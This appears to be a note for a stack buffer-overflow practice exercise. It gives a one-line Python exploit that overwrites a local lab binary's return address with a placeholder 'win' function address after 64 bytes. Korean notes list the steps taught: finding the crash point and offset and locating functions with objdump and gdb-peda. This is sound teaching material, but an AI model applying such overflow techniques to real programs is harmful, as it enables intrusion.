# SOURCE CODE : bof_example03.c

```
[+]Exploit
python2 -c "print 'a'*64 + {win function address}" | ./bof_example03

[+]Note
: 소스 코드가 주어지지 않은 상태에서 해당 바이너리를 익스플로잇 하는 예제
: Segmentation fault가 터지는 지점을 찾는 것
: 해당 지점이 터지는 오프셋을 찾는 것
: objdump, info functions 와 같은 명령어로 함수를 찾는 방법
: gdb-peda를 이용하는 방법
: 위와 같은 방법에 대해 익힐 수 있음
```